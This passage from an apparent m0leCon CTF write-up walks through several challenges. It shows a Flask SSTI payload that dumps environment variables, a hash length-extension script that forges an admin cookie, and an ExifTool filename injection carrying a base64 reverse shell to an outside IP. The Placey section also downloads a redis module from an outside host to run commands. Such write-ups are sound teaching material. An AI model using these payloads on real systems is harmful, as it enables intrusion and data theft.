</span></span><span style=display:flex><span>            tosend <span style=color:#f92672>=</span> get_data(keys)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        print(tosend)
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>send(tosend)
</span></span><span style=display:flex><span>        <span style=color:#75715e># time.sleep(0.05)</span>
</span></span><span style=display:flex><span>        gg <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recv(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>0.1</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;ptm{&#34;</span> <span style=color:#f92672>in</span> gg:
</span></span><span style=display:flex><span>            print(gg)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;WWTTTFFFF&#34;</span>)
</span></span><span style=display:flex><span>            pause()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;died&#34;</span> <span style=color:#f92672>in</span> gg:
</span></span><span style=display:flex><span>            print(gg)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;ded&#34;</span>)
</span></span><span style=display:flex><span>            pause()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;108.128.200.4&#34;</span>, <span style=color:#ae81ff>11223</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;newgame&#34;</span>)
</span></span><span style=display:flex><span>print(r<span style=color:#f92672>.</span>recv())
</span></span><span style=display:flex><span>time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>3</span>)
</span></span><span style=display:flex><span>submit([R,UR])
</span></span><span style=display:flex><span>submit([UR]<span style=color:#f92672>*</span><span style=color:#ae81ff>20</span>)
</span></span><span style=display:flex><span>submit([UR]<span style=color:#f92672>*</span><span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>submit([(UR,UR,UR,L,UR,UR,L,UR,UR,L,UR,UR) <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>100</span>)])
</span></span><span style=display:flex><span>submit([(UR,UR,UR,L,UR,UR,L,UR,UR,L,UR,UR) <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>100</span>)])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>submit([<span style=color:#ae81ff>70</span>, <span style=color:#ae81ff>65</span>, <span style=color:#ae81ff>76</span>, <span style=color:#ae81ff>71</span>]) <span style=color:#75715e># FALG</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>The script tries desperately to jump while holding right in the beginning, hoping to make it to the walls. This does not always work, because the game is not really deterministic with network latency. Then it will try to fuzz inputs a bit, glitching through the walls. Once it is reasonably sure that it has reached the flag, it will send the keypresses for &ldquo;FALG&rdquo; and wait.</p><p><code>ptm{thr0ugh_7he_wall5!_but_wher3_1s_peach??}</code></p><h1 id=web>web<a hidden class=anchor aria-hidden=true href=#web>#</a></h1><h2 id=dumb-forum>Dumb Forum<a hidden class=anchor aria-hidden=true href=#dumb-forum>#</a></h2><blockquote><p><strong>Author:</strong> @italianconcerto</p><p><strong>Description:</strong> You&rsquo;re telling me you can&rsquo;t break such a simple forum?</p></blockquote><p>We are provided with a Flask application that contains a user system, but it is also possible to post public posts to the index page.</p><p>The flag is set in an environment variable in the <code>Dockerfile</code>. Knowing this we know our goal is to get access to the system environment variables.</p><p>After reading through the source code of the Flask application, we find the following route (<code>/profile</code>) where the user can edit and view its profile.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/profile&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#a6e22e>@login_required</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>profile</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;app/templates/profile.html&#39;</span>) <span style=color:#66d9ef>as</span> p:
</span></span><span style=display:flex><span>        profile_html <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    profile_html <span style=color:#f92672>=</span> profile_html <span style=color:#f92672>%</span> (current_user<span style=color:#f92672>.</span>username, current_user<span style=color:#f92672>.</span>email, current_user<span style=color:#f92672>.</span>about_me)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(current_user<span style=color:#f92672>.</span>about_me <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>):
</span></span><span style=display:flex><span>        current_user<span style=color:#f92672>.</span>about_me <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template_string(profile_html)
</span></span></code></pre></div><p>Flask has existing methods for rendering template, for example <a href=https://flask.palletsprojects.com/en/2.1.x/api/#flask.render_template><code>render_template</code></a>. However, in this case we see that the <code>profile</code> route reads the template file and uses string format instead to inject the <code>username</code>, <code>email</code>, and <code>about_me</code> of the user into the template.</p><p>In <code>profile.html</code> we can see this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>h5</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;card-title&#34;</span>&gt;Username: %s&lt;/<span style=color:#f92672>h5</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>p</span>&gt;Email: %s&lt;/<span style=color:#f92672>p</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>p</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>&gt;About me: %s&lt;/<span style=color:#f92672>p</span>&gt;
</span></span></code></pre></div><p>The form is parsed through <code>EditProfileForm</code>, which contains:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>EditProfileForm</span>(FlaskForm):
</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> StringField(<span style=color:#e6db74>&#39;Username&#39;</span>, validators<span style=color:#f92672>=</span>[DataRequired()])
</span></span><span style=display:flex><span>    about_me <span style=color:#f92672>=</span> TextAreaField(<span style=color:#e6db74>&#39;About me&#39;</span>, validators<span style=color:#f92672>=</span>[Length(min<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>, max<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>)])
</span></span><span style=display:flex><span>    submit <span style=color:#f92672>=</span> SubmitField(<span style=color:#e6db74>&#39;Submit&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self, original_username, <span style=color:#f92672>*</span>args, <span style=color:#f92672>**</span>kwargs):
</span></span><span style=display:flex><span>        super(EditProfileForm, self)<span style=color:#f92672>.</span>__init__(<span style=color:#f92672>*</span>args, <span style=color:#f92672>**</span>kwargs)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>original_username <span style=color:#f92672>=</span> original_username
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>validate_username</span>(self, username):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> <span style=color:#e6db74>&#34;}{&#34;</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> c <span style=color:#f92672>in</span> username<span style=color:#f92672>.</span>data:
</span></span><span style=display:flex><span>                abort(<span style=color:#ae81ff>400</span>)
</span></span><span style=display:flex><span>                <span style=color:#75715e>#raise ValidationError(&#39;Please use valid characters.&#39;)</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> username<span style=color:#f92672>.</span>data <span style=color:#f92672>!=</span> self<span style=color:#f92672>.</span>original_username:
</span></span><span style=display:flex><span>            user <span style=color:#f92672>=</span> User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(username<span style=color:#f92672>=</span>self<span style=color:#f92672>.</span>username<span style=color:#f92672>.</span>data)<span style=color:#f92672>.</span>first()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> user <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>                abort(<span style=color:#ae81ff>409</span>)
</span></span><span style=display:flex><span>                <span style=color:#75715e>#raise ValidationError(&#39;Please use a different username.&#39;)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>validate_about_me</span>(self, about_me):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> <span style=color:#e6db74>&#34;}{&#34;</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> c <span style=color:#f92672>in</span> about_me<span style=color:#f92672>.</span>data:
</span></span><span style=display:flex><span>                abort(<span style=color:#ae81ff>400</span>)
</span></span></code></pre></div><p>The form validates the <code>username</code> and <code>about_me</code> fields, and checks if they contains either of <code>}{</code> (which are typically used with <a href=https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection>SSTI (Server Side Template Injection)</a>. <em>But</em> the form does not allow editing the <code>email</code> field of the user.</p><p>We find another form, <code>RegistrationForm</code> which is used during registration, and it is here, and only here, the email of the user is set. The validation of the <code>email</code> does however not include the <code>}{</code> validation, which means we can register with an email and potentially perform a SSTI.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>RegistrationForm</span>(FlaskForm):
</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> StringField(<span style=color:#e6db74>&#39;Username&#39;</span>, validators<span style=color:#f92672>=</span>[DataRequired()])
</span></span><span style=display:flex><span>    email <span style=color:#f92672>=</span> StringField(<span style=color:#e6db74>&#39;Email&#39;</span>, validators<span style=color:#f92672>=</span>[DataRequired(), Email()])
</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> PasswordField(<span style=color:#e6db74>&#39;Password&#39;</span>, validators<span style=color:#f92672>=</span>[DataRequired()])
</span></span><span style=display:flex><span>    password2 <span style=color:#f92672>=</span> PasswordField(<span style=color:#e6db74>&#39;Repeat Password&#39;</span>, validators<span style=color:#f92672>=</span>[DataRequired(), EqualTo(<span style=color:#e6db74>&#39;password&#39;</span>)])
</span></span><span style=display:flex><span>    submit <span style=color:#f92672>=</span> SubmitField(<span style=color:#e6db74>&#39;Register&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>validate_username</span>(self, username):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> <span style=color:#e6db74>&#34;}{&#34;</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> c <span style=color:#f92672>in</span> username<span style=color:#f92672>.</span>data:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>raise</span> ValidationError(<span style=color:#e6db74>&#39;Please use valid characters.&#39;</span>)
</span></span><span style=display:flex><span>        user <span style=color:#f92672>=</span> User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(username<span style=color:#f92672>=</span>username<span style=color:#f92672>.</span>data)<span style=color:#f92672>.</span>first()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> user <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>raise</span> ValidationError(<span style=color:#e6db74>&#39;Please use a different username.&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>validate_email</span>(self, email):
</span></span><span style=display:flex><span>        user <span style=color:#f92672>=</span> User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(email<span style=color:#f92672>=</span>email<span style=color:#f92672>.</span>data)<span style=color:#f92672>.</span>first()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> user <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>raise</span> ValidationError(<span style=color:#e6db74>&#39;Please use a different email address.&#39;</span>)
</span></span></code></pre></div><p>The email field does however include an email validator:
<code>email = StringField('Email', validators=[DataRequired(), Email()])</code></p><p>We see that this validator comes from <code>wtforms</code>:
<code>from wtforms.validators import ValidationError, DataRequired, Email, EqualTo</code></p><p>Looking into the source code of <a href=https://wtforms.readthedocs.io/en/2.3.x/_modules/wtforms/validators/#Email>the wtforms validator</a>, we see that it uses the <a href=https://pypi.org/project/email-validator/><code>email-validator</code></a> library.</p><p>By looking at the <a href=https://en.wikipedia.org/wiki/Email_address#Local-part>specification</a> for the local-part of an email, we see that the following characters are allowed in an email:</p><blockquote><ul><li>uppercase and lowercase Latin letters A to Z and a to z</li><li>digits 0 to 9</li><li>printable characters !#$%&&rsquo;*+-/=?^_`{|}~</li><li>dot ., provided that it is not the first or last character and provided also that it does not appear consecutively (e.g., <a href=mailto:John..Doe@example.com>John..Doe@example.com</a> is not allowed).[5]</li><li>space and special characters &ldquo;(),:;&lt;>@[] are allowed with restrictions (they are only allowed inside a quoted string, as described in the paragraph below, and in that quoted string, any backslash or double-quote must be preceded once by a backslash);
comments are allowed with parentheses at either end of the local-part; e.g., john.smith(comment)@example.com and (comment)john.smith@example.com are both equivalent to john.smith@example.com.</li></ul></blockquote><p>This means that an email such as <code>{{self.__dict__}}@a.a</code> will be considered a valid email.</p><p>We now know that our goal is to perform a SSTI on the email field.</p><p>We can use the <a href=https://flask.palletsprojects.com/en/1.1.x/api/#flask.get_flashed_messages><code>get_flashed_messages</code></a> of Flask to get the <code>__globals__</code> of the application. And with this we generate a payload that returns the environment variables of the system, resulting in the flag.
<code>{{get_flashed_messages.__globals__.os.environ}}@z.c</code></p><pre tabindex=0><code>Email: environ({
  &#34;PATH&#34;:&#34;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;,
  &#34;HOSTNAME&#34;:&#34;35250adbc3f0&#34;,
  &#34;LANG&#34;:&#34;C.UTF-8&#34;,
  &#34;GPG_KEY&#34;:&#34;A035C8C19219BA821ECEA86B64E628F8D684696D&#34;,
  &#34;PYTHON_VERSION&#34;:&#34;3.10.4&#34;,
  &#34;PYTHON_PIP_VERSION&#34;:&#34;22.0.4&#34;,
  &#34;PYTHON_SETUPTOOLS_VERSION&#34;:&#34;58.1.0&#34;,
  &#34;PYTHON_GET_PIP_URL&#34;:&#34;https://github.com/pypa/get-pip/raw/38e54e5de07c66e875c11a1ebbdb938854625dd8/public/get-pip.py&#34;,
  &#34;PYTHON_GET_PIP_SHA256&#34;:&#34;e235c437e5c7d7524fbce3880ca39b917a73dc565e0c813465b7a7a329bb279a&#34;,
  &#34;FLASK_APP&#34;:&#34;main.py&#34;,
  &#34;FLAG&#34;:&#34;ptm{d1d_u_f1nd_th3_r1ckr0ll?}&#34;,
  &#34;HOME&#39;:&#34;/home/app&#34;}
)@a.a
</code></pre><p><strong>FLAG:</strong> <code>ptm{d1d_u_f1nd_th3_r1ckr0ll?}</code></p><h2 id=fancy-notes>Fancy Notes<a hidden class=anchor aria-hidden=true href=#fancy-notes>#</a></h2><blockquote><p>Hello my friend, I need your help!
As you know, in Italy food is very important and I&rsquo;m not good at it&mldr; but I want to surprise my parents with a special recipe.
I asked Marco Giordano for an advice, he is very good, but he didn&rsquo;t want to reveal his secrets&mldr;
I know he saves his recipes on Fancy Notes, find a way to steal them.</p><p>Author: @RxThorn</p></blockquote><p>Attached to the challenge is a Python Flask application.</p><p>In the app folder inside of the <code>models.py</code> we can see that the FLAG is first read from the environemnt variable <code>FLAG</code> and in the <code>init_db</code> function we see that a new note with the flag is created and append to the <code>admin</code> users note. So in order to get the flag we will probably have to read the note as admin.</p><p>If we inspect the notes route in <code>routes.js</code> we see that it will call the method <code>get_user</code>, this method will then call <code>serialize_user</code> with the first part of the base64 decoded value of the cookie (the part before the first |). The <code>serialize_user</code> will parse the user_string and return a python dictionary. The problem with the parsing is that if the username property is set more than one time, the last username will be selected. If it is possible to add another username to the user_string, we will be able to become admin.</p><p>If we inspect the authorization for the application inside the utils.py file, we see that the whole authentication and authorizatio scheme of the application relies on a SHA256 hash. The problem with this is that we can use a length extension attack in order to add another username to the user string. This means that since the <code>serialize_user</code> method only is a dictonary, we can append another username to the user_string and then generate a valid hash (via hash extension) in order to become the admin user. To exploit this vulnerability we can use the HashPump project <a href=https://github.com/bwall/HashPump>https://github.com/bwall/HashPump</a> to perform the attack.</p><p>To run the exploit we must first register a valid user. This will give us a valid base64 encoded user cookie that contains <code>SECRET KEY + user_string</code>. The data we want to extend the string with is <code>,username=admin</code>. The small hurdle we must overcome is that in order to perform the attack, we must know the length of the secret key. This can be brute forced since the <code>/notes</code> endpoint will give HTTP response code 302 if the <code>user</code> cookie is invalid, and a 200 OK if it is valid. We can therefore brute force the length of the secret key.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> hashpumpy
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>make_request</span>(user_string, signature):
</span></span><span style=display:flex><span>    notes_url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;https://fancynotes.m0lecon.fans/notes&#34;</span>
</span></span><span style=display:flex><span>    encode_me <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>user_string<span style=color:#e6db74>}</span><span style=color:#e6db74>|</span><span style=color:#e6db74>{</span>signature<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    user_string <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>user_string<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;raw_unicode_escape&#39;</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>|</span><span style=color:#e6db74>{</span>signature<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    cookie_value <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(user_string<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;raw_unicode_escape&#39;</span>))<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    cookies <span style=color:#f92672>=</span> dict(user<span style=color:#f92672>=</span>cookie_value)
</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(notes_url, cookies<span style=color:#f92672>=</span>cookies, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> response
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>is_valid_signature</span>(user_string, signature):
</span></span><span style=display:flex><span>    resp <span style=color:#f92672>=</span> make_request(user_string, signature)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> resp<span style=color:#f92672>.</span>status_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>200</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Pwning...&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    hexdigest <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;REPLACE_WITH_RESULT_BASE64_DECODED_HASH_PART&#34;</span> 
</span></span><span style=display:flex><span>    pattern <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ptm\{(.*)\}&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>100</span>):
</span></span><span style=display:flex><span>        digest, msg <span style=color:#f92672>=</span> hashpumpy<span style=color:#f92672>.</span>hashpump(hexdigest, <span style=color:#e6db74>&#34;username=hackerman,locale=en&#34;</span>, <span style=color:#e6db74>&#34;,username=admin&#34;</span>, x)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> is_valid_signature(msg, digest):
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Correct length is: </span><span style=color:#e6db74>{</span>x<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> make_request(msg, digest)
</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(pattern, response<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>            flag <span style=color:#f92672>=</span> result<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Flag is: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><p>If we run the script with the correctly configured values we get the flag:</p><p><strong>FLAG:</strong><code>ptm{pleaseD0NOTUseCr3am1nCarbon4r4!}</code></p><h1 id=misc>misc<a hidden class=anchor aria-hidden=true href=#misc>#</a></h1><h2 id=placey>Placey<a hidden class=anchor aria-hidden=true href=#placey>#</a></h2><blockquote><p>I was really sad when r/place ended so I built my own.
<a href=https://placey.m0lecon.fans>Mirror 1</a>
<a href=https://placey2.m0lecon.fans>Mirror 2</a>
<a href=https://placey3.m0lecon.fans>Mirror 3</a>
<a href=https://placey4.m0lecon.fans>Mirror 4</a></p><p>Note: flag is in <code>/root/flag.txt</code></p><p><em>Author: @0000matteo0000</em></p></blockquote><p>We get access to a website that implements the Reddit April fools feature, where you can log in and place pixels on the board. The website is very unstable and slow, and the feature does not really work, but it quickly shows that it is not actually required either.</p><p>The website also features a user system, where you can upload profile pictures. Uploading random (non-image) files gives the following error message in return:</p><p><code>Only image file types are accepted (JPEG, PNG, GIF). Powered by ExifTool 12.37</code></p><p>Searching for this particular version of ExifTool, shows that it is vulnerable to <code>CVE-2022-23935</code>, where a file name that ends with &ldquo;|&rdquo; (pipe symbol) leads to command execution.</p><p>Glancing over the really annoying CSRF token system, and the fact that the website was not always responding, this it the meat of the exploit when using cURL</p><p><code>-F "avatar=@gg.jpg;filename=x|echo YmFzaCAtaSA+JiAvZGV2L3RjcC8zLjE0MC4yMjMuNy8xMDUzNCAwPiYxIA== |base64 -d | bash |"</code></p><p>Since certain symbols break the command, encoding it let us use slash symbols and such. The above payload is a reverse shell.</p><p>Once dropped on the server, we discover that the flag is not readable by us.</p><pre tabindex=0><code>appuser@placey4:/root$ ls -la
ls -la
total 16
drwx---r-x 1 root root        19 May 12 19:45 .
drwxr-xr-x 1 root root        52 May 13 18:05 ..
-rw-r--r-- 1 root root       571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root       161 Jul  9  2019 .profile
-rwxrwxr-x 1 root root       275 May 12 19:34 entrypoint.sh
-rw-r----- 1 root redisgroup  45 May 12 19:45 flag.txt
drwxr-xr-x 1 root root        21 May 12 19:45 quart
drwxr-xr-x 1 root root         6 May 12 19:44 redis
</code></pre><p>It is only readable by users in the redisgroup group, and appuser is not part of it. The usual privesc options like sudo require password to run, so we can&rsquo;t use that either. However, the redis server is running as the redis user, so if we can trick the redis server into reading the file for us, it should work out.</p><p>Getting redis to actually do that, however, was not very easy. Especially for a warmup challenge. We ended up compiling a custom module for redis that allowed command execution, then using the limited python installation to download it</p><pre tabindex=0><code>python3 -c &#34;import urllib.request; s = urllib.request.urlopen(&#39;https://vps.here/module.so&#39;).read(); fd=open(&#39;/tmp/module.so&#39;,&#39;wb&#39;);fd.write(s);fd.close()&#34;
</code></pre><pre tabindex=0><code>appuser@placey4:/tmp/$ chmod +x module.so
chmod +x a.so
appuser@placey4:/tmp/$ redis-cli
redis-cli
MODULE LOAD /tmp/module.so
OK
system.exec &#34;id&#34;
uid=101(redisuser) gid=101(redisgroup) groups=101(redisgroup)

system.exec &#34;cat /root/flag.txt&#34;
ptm{th3r3_w1ll_n3v3r_b3_@_pl@c3y_l1k3_h0m3y}
</code></pre><h1 id=crypto>crypto<a hidden class=anchor aria-hidden=true href=#crypto>#</a></h1><h2 id=moo>MOO<a hidden class=anchor aria-hidden=true href=#moo>#</a></h2><blockquote><p>One of the cows in our farm started to say weird numbers instead of MOOing, can you guess what it&rsquo;s saying?</p><pre tabindex=0><code>nc challs.m0lecon.it 1753
</code></pre><p><em>Author: @brooklyn</em></p></blockquote><p>The code we are given has two parts. The first is normal RSA encryption, using some special prime generation functions, and the flag is encrypted using this cryptosystem. We are given <code>(N, c, e)</code>, i.e. all the public parameters. The second part has some mystery functions f1 and f2. The server lets us call these functions with our own inputs, but only 10 times.</p><p>Doing some code searches online, quickly reveals that these functions represent how to calculate multiplicative order. This is not something you can do over a semiprime without having intimate knowledge about the factorization, so it gives us enough information so that we can factor N if we give smart inputs.</p><p>I based my solution on <a href=https://crypto.stackexchange.com/questions/40181/message-with-small-order-in-rsa-signature>this post</a> where it says that differences in which primes divide the order of each factor can lead to a non-trivial factor. We quickly cooked up a proof-of-concept for this, and while it doesn&rsquo;t work on every try, it works after a few attempts.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> math <span style=color:#f92672>import</span> gcd
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a<span style=color:#f92672>=</span><span style=color:#ae81ff>124846525121166472890127769845656706959834701767553316679575342375728606681436245953703527478773456698735316531921607496638484885416740029028542605893861455745313937474271661656548230159065196413238268640890</span>
</span></span><span style=display:flex><span>factors <span style=color:#f92672>=</span> [<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>19</span>, <span style=color:#ae81ff>23</span>, <span style=color:#ae81ff>29</span>, <span style=color:#ae81ff>31</span>, <span style=color:#ae81ff>37</span>, <span style=color:#ae81ff>41</span>, <span style=color:#ae81ff>43</span>, <span style=color:#ae81ff>47</span>, <span style=color:#ae81ff>53</span>, <span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>61</span>, <span style=color:#ae81ff>67</span>, <span style=color:#ae81ff>71</span>, <span style=color:#ae81ff>73</span>, <span style=color:#ae81ff>79</span>, <span style=color:#ae81ff>83</span>, <span style=color:#ae81ff>89</span>, <span style=color:#ae81ff>97</span>, <span style=color:#ae81ff>101</span>, <span style=color:#ae81ff>103</span>, <span style=color:#ae81ff>107</span>, <span style=color:#ae81ff>109</span>, <span style=color:#ae81ff>113</span>, <span style=color:#ae81ff>127</span>, <span style=color:#ae81ff>131</span>, <span style=color:#ae81ff>137</span>, <span style=color:#ae81ff>139</span>, <span style=color:#ae81ff>149</span>, <span style=color:#ae81ff>151</span>, <span style=color:#ae81ff>157</span>, <span style=color:#ae81ff>163</span>, <span style=color:#ae81ff>167</span>, <span 